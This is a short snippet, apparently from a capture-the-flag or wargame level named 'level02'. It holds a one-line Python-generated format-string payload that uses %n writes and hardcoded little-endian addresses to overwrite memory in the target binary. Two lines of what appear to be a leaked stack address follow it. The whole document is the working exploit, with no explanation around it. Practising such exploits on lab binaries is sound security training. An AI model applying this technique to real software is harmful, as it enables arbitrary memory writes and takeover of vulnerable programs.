cat <(python -c 'print "%.0s%.0s%.0s%.0s%.0s%.0s%.0s"+ ("A"*10) + "%n" + "%098ld" + "%n" + "A" * 51 + "\n" + "\xe1\x11\x60\x00\x00\x00\x00\x00AAAAAAAA\xe0\x11\x60\x00\x00\x00\x00\x00" + ("A"*75) + "\n",') - | ./level02

00 00 7f ff ff ff e5 00

\x00\xe5\xff\xff\xff\x7f\x00\x00